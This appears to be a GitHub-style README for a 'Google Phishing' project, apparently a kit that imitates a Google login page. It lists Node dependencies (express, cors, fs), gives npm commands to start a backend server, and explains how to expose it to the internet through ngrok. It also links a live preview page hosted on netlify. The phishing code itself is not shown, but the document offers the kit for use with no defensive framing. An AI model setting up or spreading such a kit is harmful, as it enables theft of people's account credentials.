# Google Phishing

One of my old phishing projects. Tested on Linux only. 

## Install

Dependencies:

- `express`
- `cors`
- `fs`

```bash
cd backend
npm ci
```

### ngrok

To use with ngrok, go to the [website](https://ngrok.com), install and configure the auth token.

## Use

To use, run the following commands:

```bash
cd backend
npm run server
```

After that, open another terminal in the project and run:

```bash
cd backend
npm run ngrok
```

## Preview

https://authentication-deamon-v3-auth.netlify.app
